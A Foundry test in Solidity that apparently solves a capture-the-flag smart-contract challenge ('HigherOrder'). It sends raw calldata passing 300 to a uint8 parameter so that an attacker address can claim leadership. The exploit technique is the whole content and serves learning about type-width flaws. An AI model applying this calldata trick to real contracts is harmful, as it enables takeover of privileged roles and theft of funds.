// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function commander() external returns(address);
}

contract HigherOrderTest is Test {
    address higherOrder;
    address attacker = makeAddr("attacker");

    function setUp() public {
        higherOrder = deployCode("HigherOrder.sol:HigherOrder");
    }
    function test_Challenge30_Passed() public {
        bytes memory callData = abi.encodeWithSignature("registerTreasury(uint8)", uint256(300));
        (bool success,) = higherOrder.call(callData);
        vm.prank(attacker);
        IHigherOrder(higherOrder).claimLeadership();
        assertEq(IHigherOrder(higherOrder).commander(), attacker);
    }
} 